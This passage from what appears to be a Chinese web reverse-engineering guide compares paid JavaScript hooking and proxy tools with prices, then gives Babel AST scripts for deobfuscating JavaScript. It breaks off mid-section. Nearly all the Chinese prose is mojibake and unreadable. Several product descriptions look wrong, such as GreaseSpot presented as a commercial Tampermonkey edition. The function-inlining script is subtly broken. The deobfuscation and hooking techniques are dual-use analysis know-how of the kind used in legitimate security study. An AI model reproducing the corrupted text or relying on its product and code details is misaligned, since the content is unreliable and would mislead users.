<p><strong>æ ¸å¿ƒåŠŸèƒ½</strong>:</p>
<ul>
<li>HTTP/HTTPS ä»£ç†æ‹¦æˆª</li>
<li>æ‰«æå™¨ï¼ˆä¸»åŠ¨/è¢«åŠ¨ï¼‰</li>
<li>Intruderï¼ˆè‡ªåŠ¨åŒ–æ”»å‡»ï¼‰</li>
<li>Repeaterï¼ˆè¯·æ±‚é‡æ”¾ï¼‰</li>
<li><strong>Burp æ‰©å±•</strong>ï¼šæ”¯æŒ JavaScript Hook æ’ä»¶</li>
</ul>
<p><strong>ä»·æ ¼</strong>:</p>
<ul>
<li>Professional: $449/å¹´</li>
<li>Enterprise: $3,999/å¹´+</li>
</ul>
<p><strong>JavaScript Hook é›†æˆ</strong>:</p>
<pre><code class="language-javascript">// ä½¿ç”¨ Burp Extension: JS Link
// å¯åœ¨Burpä¸­ç›´æ¥æ³¨å…¥Hookè„šæœ¬
</code></pre>
<p><strong>å®˜ç½‘</strong>: https://portswigger.net/burp</p>
<p><strong>ä¼ä¸šä¼˜åŠ¿</strong>:</p>
<ul>
<li>å¼ºå¤§çš„æ¼æ´æ‰«æ</li>
<li>å®Œæ•´çš„æµ‹è¯•æŠ¥å‘Š</li>
<li>å›¢é˜Ÿåä½œåŠŸèƒ½</li>
<li>ä¸“ä¸šæŠ€æœ¯æ”¯æŒ</li>
</ul>
<hr />
<h3>2. æµè§ˆå™¨è‡ªåŠ¨åŒ– Hook å¹³å°</h3>
<h4>Sauce Labs Real Device Cloud</h4>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>çœŸå®è®¾å¤‡å’Œæµè§ˆå™¨äº‘æµ‹è¯•</li>
<li>è‡ªåŠ¨åŒ– Hook è„šæœ¬æ³¨å…¥</li>
<li>å®æ—¶äº¤äº’è°ƒè¯•</li>
<li>è§†é¢‘å½•åˆ¶å’Œæ—¥å¿—</li>
</ul>
<p><strong>å®šä»·</strong>:</p>
<ul>
<li>Live Testing: $39/æœˆèµ·</li>
<li>Automated Testing: $199/æœˆèµ·</li>
<li>Enterprise: å®šåˆ¶åŒ–</li>
</ul>
<p><strong>é€‚ç”¨</strong>:</p>
<ul>
<li>è·¨æµè§ˆå™¨ Hook æµ‹è¯•</li>
<li>ç§»åŠ¨ç«¯ JavaScript è°ƒè¯•</li>
<li>CI/CD é›†æˆ</li>
</ul>
<p><strong>å®˜ç½‘</strong>: https://saucelabs.com/</p>
<hr />
<h4>LambdaTest</h4>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>3000+æµè§ˆå™¨å’Œæ“ä½œç³»ç»Ÿç»„åˆ</li>
<li>è‡ªåŠ¨åŒ–æµ‹è¯•å’Œæ‰‹åŠ¨è°ƒè¯•</li>
<li>é›†æˆå¼€å‘è€…å·¥å…·</li>
</ul>
<p><strong>å®šä»·</strong>:</p>
<ul>
<li>Live: $15/æœˆèµ·</li>
<li>Automation: $99/æœˆèµ·</li>
</ul>
<p><strong>ç›¸æ¯” Sauce Labs æ›´ä¾¿å®œ</strong></p>
<p><strong>å®˜ç½‘</strong>: https://www.lambdatest.com/</p>
<hr />
<h3>3. ä¼ä¸šçº§åº”ç”¨ç›‘æ§ï¼ˆAPMï¼‰é›†æˆ Hook</h3>
<h4>Datadog RUMï¼ˆReal User Monitoringï¼‰</h4>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>å‰ç«¯æ€§èƒ½ç›‘æ§</li>
<li>JavaScript é”™è¯¯è¿½è¸ª</li>
<li>è‡ªå®šä¹‰ Hook æ³¨å…¥</li>
<li>ç”¨æˆ·è¡Œä¸ºåˆ†æ</li>
</ul>
<p><strong>æŠ€æœ¯å®ç°</strong>:</p>
<pre><code class="language-javascript">// Datadog è‡ªåŠ¨æ³¨å…¥ Hook
import { datadogRum } from &quot;@datadog/browser-rum&quot;;

datadogRum.init({
  applicationId: &quot;&lt;YOUR_APP_ID&gt;&quot;,
  clientToken: &quot;&lt;YOUR_CLIENT_TOKEN&gt;&quot;,
  // è‡ªåŠ¨Hook XHR/Fetch
  trackInteractions: true,
  trackFrustrations: true,
});
</code></pre>
<p><strong>ä»·æ ¼</strong>: $0.90/1000 sessions èµ·</p>
<p><strong>å®˜ç½‘</strong>: https://www.datadoghq.com/</p>
<p><strong>ä¼ä¸šä»·å€¼</strong>: ç”Ÿäº§ç¯å¢ƒ Hook + ç›‘æ§ä¸€ä½“åŒ–</p>
<hr />
<h4>New Relic Browser</h4>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>æµè§ˆå™¨æ€§èƒ½ç›‘æ§</li>
<li>JavaScript é”™è¯¯ Hook</li>
<li>AJAX è¯·æ±‚è‡ªåŠ¨è¿½è¸ª</li>
<li>Session Trace</li>
</ul>
<p><strong>ä»·æ ¼</strong>: $75/æœˆèµ·</p>
<p><strong>å®˜ç½‘</strong>: https://newrelic.com/</p>
<hr />
<h3>4. å•†ä¸š Hook è„šæœ¬åº“å’Œå¹³å°</h3>
<h4>GreaseSpotï¼ˆTampermonkey å•†ä¸šç‰ˆï¼‰</h4>
<p><strong>ç±»å‹</strong>: ç”¨æˆ·è„šæœ¬ç®¡ç†å™¨ï¼ˆå…è´¹+å•†ä¸šæ”¯æŒï¼‰</p>
<p><strong>ä¼ä¸šåŠŸèƒ½</strong>:</p>
<ul>
<li>è„šæœ¬ç­¾åå’Œå®‰å…¨å®¡è®¡</li>
<li>ä¼ä¸šè„šæœ¬åº“ç®¡ç†</li>
<li>éƒ¨ç½²è‡ªåŠ¨åŒ–</li>
</ul>
<p><strong>ä»·æ ¼</strong>:</p>
<ul>
<li>ä¸ªäººå…è´¹</li>
<li>ä¼ä¸šæ”¯æŒ: å®šåˆ¶åŒ–å®šä»·</li>
</ul>
<p><strong>å®˜ç½‘</strong>: https://www.greasespot.net/</p>
<hr />
<h4>Requestlyï¼ˆä¼ä¸šçº§è¯·æ±‚ä¿®æ”¹ï¼‰</h4>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>HTTP è¯·æ±‚æ‹¦æˆªå’Œä¿®æ”¹</li>
<li>JavaScript æ³¨å…¥</li>
<li>Header ä¿®æ”¹</li>
<li>Mock API</li>
</ul>
<p><strong>å®šä»·</strong>:</p>
<ul>
<li>Free: åŸºç¡€åŠŸèƒ½</li>
<li>Professional: $12/æœˆ</li>
<li>Team: $25/æœˆ/ç”¨æˆ·</li>
<li>Enterprise: å®šåˆ¶åŒ–</li>
</ul>
<p><strong>ç‹¬ç‰¹ä¼˜åŠ¿</strong>:</p>
<ul>
<li>äº‘ç«¯è§„åˆ™åŒæ­¥</li>
<li>å›¢é˜Ÿåä½œ</li>
<li>è§„åˆ™å¸‚åœº</li>
</ul>
<p><strong>å®˜ç½‘</strong>: https://requestly.io/</p>
<hr />
<h3>5. åŠ¨æ€åˆ†æå³æœåŠ¡ï¼ˆDaaSï¼‰</h3>
<h4>Zimperium zScanï¼ˆç§»åŠ¨åº”ç”¨å®‰å…¨ï¼‰</h4>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>è‡ªåŠ¨åŒ– JavaScript Hook</li>
<li>è¿è¡Œæ—¶å¨èƒæ£€æµ‹</li>
<li>API å®‰å…¨åˆ†æ</li>
<li>è¡Œä¸ºåˆ†æ</li>
</ul>
<p><strong>é€‚ç”¨</strong>: iOS/Android åº”ç”¨å®‰å…¨æµ‹è¯•</p>
<p><strong>ä»·æ ¼</strong>: ä¼ä¸šå®šä»·ï¼ˆ$10,000+/å¹´ï¼‰</p>
<p><strong>å®˜ç½‘</strong>: https://www.zimperium.com/</p>
<hr />
<h3>6. æˆæœ¬æ•ˆç›Šå¯¹æ¯”</h3>
<h4>åœºæ™¯ 1: ä¸ªäººå­¦ä¹ /ç ”ç©¶</h4>
<p><strong>æ¨èæ–¹æ¡ˆ</strong>:</p>
<ul>
<li>Chrome DevToolsï¼ˆå…è´¹ï¼‰</li>
<li>æ‰‹å†™ Hook è„šæœ¬</li>
<li>Tampermonkeyï¼ˆå…è´¹ï¼‰</li>
</ul>
<p><strong>æ€»æˆæœ¬</strong>: <strong>$0</strong></p>
<hr />
<h4>åœºæ™¯ 2: å°å›¢é˜Ÿ Web é€†å‘é¡¹ç›®</h4>
<p><strong>æ¨èæ–¹æ¡ˆ</strong>:</p>
<ul>
<li>Burp Suite Professionalï¼ˆ$449/å¹´ï¼‰</li>
<li>Charles Proxyï¼ˆ$50 ä¸€æ¬¡æ€§ï¼‰</li>
<li>è‡ªå®šä¹‰ Hook è„šæœ¬åº“</li>
</ul>
<p><strong>æ€»æˆæœ¬</strong>: <strong>~$500 ç¬¬ä¸€å¹´ï¼Œ$449 åç»­/å¹´</strong></p>
<p><strong>ROI</strong>: ä¸“ä¸šå·¥å…·èŠ‚çœæ—¶é—´ï¼Œæé«˜æ•ˆç‡</p>
<hr />
<h4>åœºæ™¯ 3: ä¼ä¸šå®‰å…¨å›¢é˜Ÿ</h4>
<p><strong>æ¨èæ–¹æ¡ˆ</strong>:</p>
<ul>
<li>Burp Suite Enterpriseï¼ˆ$3,999/å¹´ï¼‰</li>
<li>Datadog RUMï¼ˆ$1,000+/æœˆï¼Œç”Ÿäº§ç›‘æ§ï¼‰</li>
<li>ä¸“ä¸šå’¨è¯¢æœåŠ¡ï¼ˆæŒ‰éœ€ï¼‰</li>
</ul>
<p><strong>æ€»æˆæœ¬</strong>: <strong>$15,000-50,000/å¹´</strong></p>
<p><strong>ä¼ä¸šä»·å€¼</strong>:</p>
<ul>
<li>åˆè§„å®¡è®¡æŠ¥å‘Š</li>
<li>24/7 æŠ€æœ¯æ”¯æŒ</li>
<li>å›¢é˜Ÿåä½œåŠŸèƒ½</li>
<li>ç”Ÿäº§ç¯å¢ƒç›‘æ§</li>
</ul>
<hr />
<h3>7. å¼€æº vs å•†ä¸šå†³ç­–çŸ©é˜µ</h3>
<table>
<thead>
<tr>
  <th>å› ç´ </th>
  <th>æ¨èå¼€æº</th>
  <th>æ¨èå•†ä¸š</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>é¢„ç®—</strong></td>
  <td>&lt; $1,000/å¹´</td>
  <td>&gt; $5,000/å¹´</td>
</tr>
<tr>
  <td><strong>å›¢é˜Ÿè§„æ¨¡</strong></td>
  <td>&lt; 3 äºº</td>
  <td>&gt; 5 äºº</td>
</tr>
<tr>
  <td><strong>é¡¹ç›®ç±»å‹</strong></td>
  <td>ä¸€æ¬¡æ€§é€†å‘</td>
  <td>æŒç»­å®‰å…¨æµ‹è¯•</td>
</tr>
<tr>
  <td><strong>æŠ€æœ¯èƒ½åŠ›</strong></td>
  <td>é«˜ï¼ˆèƒ½è‡ªå·±å†™è„šæœ¬ï¼‰</td>
  <td>ä¸­ä½ï¼ˆéœ€è¦ GUI å·¥å…·ï¼‰</td>
</tr>
<tr>
  <td><strong>åˆè§„è¦æ±‚</strong></td>
  <td>æ— </td>
  <td>éœ€è¦å®¡è®¡æŠ¥å‘Š</td>
</tr>
<tr>
  <td><strong>æ”¯æŒéœ€æ±‚</strong></td>
  <td>ç¤¾åŒºå°±å¤Ÿ</td>
  <td>éœ€è¦å•†ä¸šæ”¯æŒ</td>
</tr>
</tbody>
</table>
<hr />
<h3>8. äº‘ç«¯ Hook æœåŠ¡ï¼ˆæ–°å…´ï¼‰</h3>
<h4>Browserless.io Hook Support</h4>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>äº‘ç«¯æµè§ˆå™¨ Hook æ³¨å…¥</li>
<li>æ— éœ€æœ¬åœ°ç¯å¢ƒ</li>
<li>API è°ƒç”¨æ–¹å¼</li>
</ul>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">const response = await fetch(&quot;https://chrome.browserless.io/function&quot;, {
  method: &quot;POST&quot;,
  headers: { &quot;Content-Type&quot;: &quot;application/json&quot; },
  body: JSON.stringify({
    code: `
            // Hookä»£ç 
            const original = XMLHttpRequest.prototype.send;
            XMLHttpRequest.prototype.send = function(...args) {
                console.log('Hooked:', args);
                return original.apply(this, args);
            };
        `,
    context: {
      url: &quot;https://example.com&quot;,
    },
  }),
});
</code></pre>
<p><strong>ä»·æ ¼</strong>: $29-299/æœˆï¼ˆè§ automation_scripts.mdï¼‰</p>
<hr />
<h3>9. AI è¾…åŠ© Hook å¼€å‘</h3>
<h4>GitHub Copilot for Security</h4>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>è‡ªåŠ¨ç”Ÿæˆ Hook è„šæœ¬</li>
<li>å®‰å…¨æ¼æ´æ£€æµ‹</li>
<li>ä»£ç è¡¥å…¨</li>
</ul>
<p><strong>ä»·æ ¼</strong>: $100/å¹´ï¼ˆä¸ªäººï¼‰</p>
<p><strong>ç¤ºä¾‹ Prompt</strong>:</p>
<pre><code class="language-javascript">// Prompt: Write a hook for XMLHttpRequest that logs all requests
// Copilot è‡ªåŠ¨ç”Ÿæˆå®Œæ•´Hookä»£ç 
</code></pre>
<hr />
<h4>ChatGPT/Claude è¾…åŠ©</h4>
<p><strong>åº”ç”¨</strong>:</p>
<ul>
<li>è§£é‡Šå¤æ‚ Hook é€»è¾‘</li>
<li>ç”Ÿæˆå®šåˆ¶åŒ– Hook è„šæœ¬</li>
<li>è°ƒè¯• Hook ä»£ç </li>
</ul>
<p><strong>æˆæœ¬</strong>: $20/æœˆï¼ˆChatGPT Plusï¼‰æˆ–æŒ‰éœ€ API è°ƒç”¨</p>
<hr />
<h3>10. å®æˆ˜å·¥å…·é“¾æ¨è</h3>
<h4>åˆå­¦è€…ï¼ˆ$0 æˆæœ¬ï¼‰</h4>
<p><strong>å·¥å…·ç»„åˆ</strong>:</p>
<ol>
<li>Chrome DevToolsï¼ˆå…è´¹ï¼‰</li>
<li>Tampermonkeyï¼ˆå…è´¹ï¼‰</li>
<li>æœ¬æ–‡æ¡£çš„ Hook è„šæœ¬åº“</li>
</ol>
<p><strong>èƒ½åŠ›</strong>:</p>
<ul>
<li>åŸºç¡€ Hook</li>
<li>ç½‘ç»œè¯·æ±‚ç›‘æ§</li>
<li>Cookie/Storage æ“ä½œ</li>
</ul>
<hr />
<h4>ä¸“ä¸šäººå£«ï¼ˆ&lt; $1,000/å¹´ï¼‰</h4>
<p><strong>å·¥å…·ç»„åˆ</strong>:</p>
<ol>
<li>Burp Suite Professionalï¼ˆ$449/å¹´ï¼‰</li>
<li>Charles Proxyï¼ˆ$50 ä¸€æ¬¡æ€§ï¼‰</li>
<li>GitHub Copilotï¼ˆ$100/å¹´ï¼‰</li>
<li>Requestly Proï¼ˆ$144/å¹´ï¼‰</li>
</ol>
<p><strong>æ€»æˆæœ¬</strong>: <strong>~$750/å¹´</strong></p>
<p><strong>èƒ½åŠ›æå‡</strong>:</p>
<ul>
<li>ä¼ä¸šçº§æ‹¦æˆªå’Œä¿®æ”¹</li>
<li>è‡ªåŠ¨åŒ– Hook ç”Ÿæˆ</li>
<li>å›¢é˜Ÿåä½œ</li>
</ul>
<hr />
<h4>ä¼ä¸šå›¢é˜Ÿï¼ˆ$10,000+/å¹´ï¼‰</h4>
<p><strong>å·¥å…·ç»„åˆ</strong>:</p>
<ol>
<li>Burp Suite Enterpriseï¼ˆ$3,999/å¹´ï¼‰</li>
<li>Datadog RUMï¼ˆ$12,000/å¹´ï¼‰</li>
<li>ä¸“ä¸šåŸ¹è®­å’Œå’¨è¯¢ï¼ˆæŒ‰éœ€ï¼‰</li>
<li>è‡ªå»º Hook å¹³å°ï¼ˆå¼€å‘æˆæœ¬ï¼‰</li>
</ol>
<p><strong>ROI åˆ†æ</strong>:</p>
<ul>
<li>å‡å°‘äººå·¥åˆ†ææ—¶é—´ 60%+</li>
<li>æä¾›å®¡è®¡æŠ¥å‘Š</li>
<li>ç”Ÿäº§ç¯å¢ƒå®æ—¶ç›‘æ§</li>
<li>é™ä½å®‰å…¨é£é™©</li>
</ul>
<hr />
<h3>11. è¡Œä¸šæ¡ˆä¾‹å‚è€ƒ</h3>
<h4>é‡‘èè¡Œä¸šï¼ˆé«˜åˆè§„è¦æ±‚ï¼‰</h4>
<p><strong>æ–¹æ¡ˆ</strong>:</p>
<ul>
<li>Burp Suite Enterprise</li>
<li>Datadog APM</li>
<li>å†…éƒ¨å®¡è®¡ç³»ç»Ÿé›†æˆ</li>
</ul>
<p><strong>æˆæœ¬</strong>: $50,000/å¹´</p>
<p><strong>æ”¶ç›Š</strong>: æ»¡è¶³ PCI DSS åˆè§„è¦æ±‚</p>
<hr />
<h4>å®‰å…¨å…¬å¸ï¼ˆä¸“ä¸šæœåŠ¡ï¼‰</h4>
<p><strong>æ–¹æ¡ˆ</strong>:</p>
<ul>
<li>Burp Suite + Frida</li>
<li>è‡ªç ” Hook æ¡†æ¶</li>
<li>å¤šè¯­è¨€æ”¯æŒ</li>
</ul>
<p><strong>æˆæœ¬</strong>: $5,000/å¹´ï¼ˆå·¥å…·ï¼‰+ å¼€å‘æˆæœ¬</p>
<p><strong>æ”¶ç›Š</strong>: å¯å¯¹å¤–æä¾›ä¸“ä¸šæœåŠ¡</p>
<hr />
<h4>ç”µå•†å¹³å°ï¼ˆä¸šåŠ¡ç›‘æ§ï¼‰</h4>
<p><strong>æ–¹æ¡ˆ</strong>:</p>
<ul>
<li>New Relic Browser</li>
<li>è‡ªå®šä¹‰ Hook ç›‘æ§å…³é”®ä¸šåŠ¡æµç¨‹</li>
</ul>
<p><strong>æˆæœ¬</strong>: $15,000/å¹´</p>
<p><strong>æ”¶ç›Š</strong>: æå‡ç”¨æˆ·ä½“éªŒï¼Œé™ä½æµå¤±ç‡</p>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-26">è°ƒè¯•æŠ€å·§ä¸æ–­ç‚¹è®¾ç½®</a></li>
<li><a href="#section-32">JavaScript åæ··æ·†</a></li>
<li><a href="#section-15">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
<li><a href="#section-61">åŠ å¯†ç®—æ³•è¯†åˆ«è„šæœ¬</a></li>
<li><a href="#section-60">æµè§ˆå™¨è‡ªåŠ¨åŒ–è„šæœ¬</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-59">
                                                <h2>[R58] Deobfuscation Scripts</h2>
                                                <h1>R58: åæ··æ·†è„šæœ¬</h1>
<h2>æ¦‚è¿°</h2>
<p>JavaScript æ··æ·†æ˜¯ä¿æŠ¤ä»£ç é€»è¾‘çš„å¸¸ç”¨æ‰‹æ®µã€‚æœ¬ç« æä¾›å¸¸ç”¨çš„åæ··æ·†è„šæœ¬å’ŒæŠ€æœ¯ï¼Œå¸®åŠ©è¿˜åŸæ··æ·†åçš„ä»£ç ã€‚</p>
<hr />
<h2>æ··æ·†ç±»å‹è¯†åˆ«</h2>
<h3>1. å˜é‡åæ··æ·†</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<pre><code class="language-javascript">var _0x1a2b = &quot;Hello&quot;;
var _0x3c4d = &quot;World&quot;;
console.log(_0x1a2b, _0x3c4d);
</code></pre>
<p><strong>å·¥å…·</strong>: Prettier æ ¼å¼åŒ–åæ‰‹åŠ¨é‡å‘½å</p>
<h3>2. å­—ç¬¦ä¸²æ•°ç»„æ··æ·†</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<pre><code class="language-javascript">var _0x1234 = [&quot;Hello&quot;, &quot;World&quot;, &quot;console&quot;, &quot;log&quot;];
var _0xa = _0x1234[0];
var _0xb = _0x1234[1];
window[_0x1234[2]][_0x1234[3]](_0xa, _0xb);
</code></pre>
<p><strong>è„šæœ¬</strong>: è§ä¸‹æ–¹å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸè„šæœ¬</p>
<h3>3. æ§åˆ¶æµå¹³å¦åŒ–</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<pre><code class="language-javascript">var _0x1 = 0;
while (true) {
  switch (_0x1) {
    case 0:
      console.log(&quot;A&quot;);
      _0x1 = 1;
      break;
    case 1:
      console.log(&quot;B&quot;);
      _0x1 = 2;
      break;
    case 2:
      return;
  }
}
</code></pre>
<h3>4. æ­»ä»£ç æ³¨å…¥</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<pre><code class="language-javascript">function real() {
  var fake1 = 123;
  if (false) {
    /* æ°¸è¿œä¸ä¼šæ‰§è¡Œçš„ä»£ç  */
  }
  return &quot;real&quot;;
}
</code></pre>
<hr />
<h2>åœ¨çº¿å·¥å…·</h2>
<h3>1. Prettier</h3>
<p><strong>ç”¨é€”</strong>: æ ¼å¼åŒ–å‹ç¼©çš„ä»£ç </p>
<pre><code class="language-bash"># å®‰è£…
npm install -g prettier

# æ ¼å¼åŒ–
prettier --write obfuscated.js
</code></pre>
<p><strong>åœ¨çº¿ç‰ˆ</strong>: https://prettier.io/playground/</p>
<h3>2. JS-Beautify</h3>
<p><strong>ç”¨é€”</strong>: ç¾åŒ– JavaScript ä»£ç </p>
<pre><code class="language-bash">npm install -g js-beautify
js-beautify obfuscated.js &gt; formatted.js
</code></pre>
<p><strong>åœ¨çº¿ç‰ˆ</strong>: https://beautifier.io/</p>
<h3>3. de4js</h3>
<p><strong>ç”¨é€”</strong>: ç»¼åˆåæ··æ·†å·¥å…·</p>
<p><strong>åœ¨çº¿ç‰ˆ</strong>: https://lelinhtinh.github.io/de4js/</p>
<p>æ”¯æŒ:</p>
<ul>
<li>JSFuck</li>
<li>JJencode</li>
<li>AAencode</li>
<li>URLencode</li>
<li>Packer</li>
<li>JavaScript Obfuscator</li>
</ul>
<hr />
<h2>AST åæ··æ·†è„šæœ¬</h2>
<h3>åŸºç¡€æ¡†æ¶</h3>
<p>ä½¿ç”¨ Babel è§£æå’Œè½¬æ¢ ASTï¼š</p>
<pre><code class="language-javascript">const parser = require(&quot;@babel/parser&quot;);
const traverse = require(&quot;@babel/traverse&quot;).default;
const generator = require(&quot;@babel/generator&quot;).default;
const t = require(&quot;@babel/types&quot;);
const fs = require(&quot;fs&quot;);

// 1. è¯»å–æ··æ·†ä»£ç 
const code = fs.readFileSync(&quot;obfuscated.js&quot;, &quot;utf-8&quot;);

// 2. è§£æä¸º AST
const ast = parser.parse(code);

// 3. éå†å’Œè½¬æ¢
traverse(ast, {
  // åœ¨è¿™é‡Œæ·»åŠ è½¬æ¢è§„åˆ™
});

// 4. ç”Ÿæˆä»£ç 
const output = generator(ast, {}, code);
fs.writeFileSync(&quot;deobfuscated.js&quot;, output.code);
</code></pre>
<h3>è„šæœ¬ 1: å¸¸é‡æŠ˜å </h3>
<p><strong>ç›®æ ‡</strong>: è®¡ç®—å¸¸é‡è¡¨è¾¾å¼</p>
<pre><code class="language-javascript">traverse(ast, {
  BinaryExpression(path) {
    // å¦‚æœä¸¤ä¸ªæ“ä½œæ•°éƒ½æ˜¯å­—é¢é‡
    if (t.isLiteral(path.node.left) &amp;&amp; t.isLiteral(path.node.right)) {
      // è®¡ç®—ç»“æœ
      const result = eval(path.toString());
      // æ›¿æ¢ä¸ºç»“æœ
      path.replaceWith(t.valueToNode(result));
    }
  },
});
</code></pre>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// Before
var a = 1 + 2;

// After
var a = 3;
</code></pre>
<h3>è„šæœ¬ 2: å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸ</h3>
<p><strong>ç›®æ ‡</strong>: è¿˜åŸå­—ç¬¦ä¸²æ•°ç»„å¼•ç”¨</p>
<pre><code class="language-javascript">let stringArray = [];

traverse(ast, {
  // ç¬¬ä¸€æ­¥ï¼šæ‰¾åˆ°å­—ç¬¦ä¸²æ•°ç»„
  VariableDeclarator(path) {
    if (t.isArrayExpression(path.node.init)) {
      const name = path.node.id.name;
      stringArray = path.node.init.elements.map((e) =&gt; e.value);
    }
  },

  // ç¬¬äºŒæ­¥ï¼šæ›¿æ¢æ•°ç»„è®¿é—®
  MemberExpression(path) {
    // _0x1234[0] =&gt; stringArray[0]
    if (
      t.isIdentifier(path.node.object) &amp;&amp;
      t.isNumericLiteral(path.node.property)
    ) {
      const index = path.node.property.value;
      const value = stringArray[index];
      if (value !== undefined) {
        path.replaceWith(t.stringLiteral(value));
      }
    }
  },
});
</code></pre>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// Before
var _0x1234 = [&quot;log&quot;, &quot;Hello&quot;];
console[_0x1234[0]](_0x1234[1]);

// After
console[&quot;log&quot;](&quot;Hello&quot;);
// åç»­è¿˜å¯ä»¥ç»§ç»­ä¼˜åŒ–ä¸º: console.log('Hello');
</code></pre>
<h3>è„šæœ¬ 3: è®¡ç®—æˆå‘˜è¡¨è¾¾å¼</h3>
<p><strong>ç›®æ ‡</strong>: <code>obj['prop']</code> â†’ <code>obj.prop</code></p>
<pre><code class="language-javascript">traverse(ast, {
  MemberExpression(path) {
    // å¦‚æœæ˜¯ obj['prop'] å½¢å¼
    if (path.node.computed &amp;&amp; t.isStringLiteral(path.node.property)) {
      const propName = path.node.property.value;
      // æ£€æŸ¥æ˜¯å¦æ˜¯åˆæ³•æ ‡è¯†ç¬¦
      if (/^[a-zA-Z_$][a-zA-Z0-9_$]*$/.test(propName)) {
        path.node.computed = false;
        path.node.property = t.identifier(propName);
      }
    }
  },
});
</code></pre>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// Before
console[&quot;log&quot;](&quot;Hello&quot;);

// After
console.log(&quot;Hello&quot;);
</code></pre>
<h3>è„šæœ¬ 4: åˆ é™¤æ­»ä»£ç </h3>
<p><strong>ç›®æ ‡</strong>: åˆ é™¤ <code>if (false)</code> ç­‰æ­»ä»£ç </p>
<pre><code class="language-javascript">traverse(ast, {
  IfStatement(path) {
    // å¦‚æœæ¡ä»¶æ˜¯ false
    if (t.isBooleanLiteral(path.node.test, { value: false })) {
      // åˆ é™¤æ•´ä¸ª if è¯­å¥
      path.remove();
    }
    // å¦‚æœæ¡ä»¶æ˜¯ true
    else if (t.isBooleanLiteral(path.node.test, { value: true })) {
      // ç”¨ consequent æ›¿æ¢æ•´ä¸ª if
      path.replaceWithMultiple(path.node.consequent.body);
    }
  },
});
</code></pre>
<h3>è„šæœ¬ 5: å‡½æ•°å†…è”</h3>
<p><strong>ç›®æ ‡</strong>: å†…è”ç®€å•çš„åŒ…è£…å‡½æ•°</p>
<pre><code class="language-javascript">const functionMap = {};

traverse(ast, {
  // æ”¶é›†å‡½æ•°å®šä¹‰
  FunctionDeclaration(path) {
    const name = path.node.id.name;
    // åªå¤„ç†ç®€å•çš„è¿”å›è¯­å¥å‡½æ•°
    if (
      path.node.body.body.length === 1 &amp;&amp;
      t.isReturnStatement(path.node.body.body[0])
    ) {
      functionMap[name] = path.node.body.body[0].argument;
    }
  },

  // æ›¿æ¢å‡½æ•°è°ƒç”¨
  CallExpression(path) {
    if (t.isIdentifier(path.node.callee)) {
      const name = path.node.callee.name;
      if (functionMap[name]) {
        // æ›¿æ¢ä¸ºå‡½æ•°ä½“
        path.replaceWith(functionMap[name]);
      }
    }
  },
});
</code></pre>
<hr />
<h2>å®Œæ•´åæ··æ·†æµç¨‹</h2>
<h3>è‡ªåŠ¨åŒ–è„šæœ¬</h3>
<pre><code class="language-javascript">const fs = require(&quot;fs&quot;);
const parser = require(&quot;@babel/parser&quot;);
const traverse = require(&quot;@babel/traverse&quot;).default;
const generator = require(&quot;@babel/generator&quot;).default;
const t = require(&quot;@babel/types&quot;);

function deobfuscate(inputFile, outputFile) {
  console.log(`[1/5] è¯»å–æ–‡ä»¶: ${inputFile}`);
  const code = fs.readFileSync(inputFile, &quot;utf-8&quot;);

  console.log(&quot;[2/5] è§£æ AST&quot;);
  const ast = parser.parse(code);

  console.log(&quot;[3/5] å¸¸é‡æŠ˜å &quot;);
  constantFolding(ast);

  console.log(&quot;[4/5] å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸ&quot;);
  restoreStringArray(ast);

  console.log(&quot;[5/5] æ¸…ç†å’Œæ ¼å¼åŒ–&quot;);
  cleanup(ast);

  const output = generator(ast, { comments: false }, code);
  fs.writeFileSync(outputFile, output.code);
  console.log(`âœ… å®Œæˆ! è¾“å‡ºåˆ°: ${outputFile}`);
}

function constantFolding(ast) {
  traverse(ast, {
    BinaryExpression(path) {
      if (path.isConstantExpression()) {
        const result = path.evaluate();
        if (result.confident) {
          path.replaceWith(t.valueToNode(result.value));
        }
      }
    },
  });
}

function restoreStringArray(ast) {
  let stringArray = [];
  let arrayName = &quot;&quot;;

  traverse(ast, {
    VariableDeclarator(path) {
      if (t.isArrayExpression(path.node.init)) {
        arrayName = path.node.id.name;
        stringArray = path.node.init.elements.map((e) =&gt; e.value);
      }
    },
  });

  if (stringArray.length === 0) return;

  traverse(ast, {
    MemberExpression(path) {
      if (
        t.isIdentifier(path.node.object, { name: arrayName }) &amp;&amp;
        t.isNumericLiteral(path.node.property)
      ) {
        const index = path.node.property.value;
        const value = stringArray[index];
        if (value !== undefined) {
          path.replaceWith(t.stringLiteral(value));
        }
      }
    },
  });
}

function cleanup(ast) {
  traverse(ast, {
    // åˆ é™¤ç©ºè¯­å¥
    EmptyStatement(path) {
      path.remove();
    },
    // obj['prop'] -&gt; obj.prop
    MemberExpression(path) {
      if (path.node.computed &amp;&amp; t.isStringLiteral(path.node.property)) {
        const prop = path.node.property.value;
        if (/^[a-zA-Z_$][a-zA-Z0-9_$]*$/.test(prop)) {
          path.node.computed = false;
          path.node.property = t.identifier(prop);
        }
      }
    },
  });
}

// ä½¿ç”¨ç¤ºä¾‹
deobfuscate(&quot;obfuscated.js&quot;, &quot;deobfuscated.js&quot;);
</code></pre>
<hr />
<h2>é’ˆå¯¹ç‰¹å®šæ··æ·†å™¨</h2>
<h3>JavaScript Obfuscator</h3>
